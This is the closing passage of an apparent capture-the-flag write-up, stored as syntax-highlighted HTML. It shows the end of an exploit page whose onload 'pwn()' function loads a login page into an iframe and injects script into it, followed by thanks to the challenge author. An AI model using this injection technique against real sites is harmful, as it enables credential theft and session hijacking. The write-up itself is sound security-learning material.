            <span class="k">for</span> <span class="p">(</span><span class="kd">let</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">50</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="kd">var</span> <span class="nx">frame</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="dl">"</span><span class="s2">frame</span><span class="dl">"</span><span class="p">)</span>
            <span class="nx">frame</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">+</span><span class="dl">"</span><span class="s2">/../../login</span><span class="dl">"</span>
            <span class="k">await</span> <span class="nx">sleep</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span>
            <span class="nx">injectScript</span><span class="p">(</span><span class="nx">frame</span><span class="p">)</span>
        <span class="p">}</span>
    <span class="nt">&lt;/script&gt;</span>
    <span class="nt">&lt;body</span> <span class="na">onload=</span><span class="s">"pwn()"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;iframe</span> <span class="na">id=</span><span class="s">"frame"</span><span class="nt">&gt;&lt;/iframe&gt;</span>
    <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</code></pre></div></div>

<h2 id="greetings">Greetings</h2>

<p>Really big thanks to pilvar both for dealing with me and for have created such an interesting challenge. I’ve learned a lot from it.</p>

<p>I won’t talk regarding my overall experience at Lake Finals, but maybe there will be something around the end of the year :eyes:</p>

